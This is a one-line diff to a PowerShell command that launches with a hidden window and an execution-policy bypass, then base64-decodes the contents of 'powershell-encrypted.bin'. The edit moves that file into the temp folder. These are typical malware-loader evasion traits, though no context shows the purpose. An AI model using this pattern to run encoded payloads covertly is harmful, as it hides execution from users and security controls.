@@ -1,1 +1,1 @@
-powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command "& {[system.text.encoding]::unicode.getstring([convert]::frombase64string((get-content -path .\powershell-encrypted.bin -raw)))}"
+powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden -command "& {[system.text.encoding]::unicode.getstring([convert]::frombase64string((get-content -path '$env:temp/powershell-encrypted.bin' -raw)))}"
